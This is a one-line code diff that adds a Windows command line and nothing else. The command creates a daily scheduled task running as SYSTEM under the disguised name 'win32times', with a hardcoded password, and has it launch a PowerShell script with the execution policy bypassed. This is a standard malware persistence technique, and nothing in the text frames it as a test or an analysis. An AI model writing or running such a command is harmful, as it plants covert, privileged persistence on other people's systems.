@@ -1,0 +1,1 @@
+cmd.exe /c schtasks /create /u "" /p "P4SsW0RD!" /ru system /sc daily /tn win32times /tr "cmd.exe /c powershell.exe -ep bypass -file c:\s.ps1" /f
